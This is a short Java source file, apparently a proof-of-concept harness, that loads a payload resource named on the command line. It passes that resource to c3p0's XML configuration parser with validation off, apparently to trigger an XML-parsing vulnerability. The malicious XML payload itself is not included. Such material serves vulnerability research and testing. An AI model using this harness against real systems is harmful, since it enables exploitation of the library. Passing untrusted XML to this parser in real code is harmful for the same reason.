package com.mort.payload;

import com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils;
import java.io.InputStream;


/**
 * @author mort
 * @Description
 * @date 2022/9/27
 **/
public class C3p0POC {

    public static void main(String[] args) throws Exception {

        String payload = args[0];
        InputStream inputStream = C3p0POC.class.getResourceAsStream(payload);

        C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(inputStream, false);


        System.out.println("Completed!");
    }
}

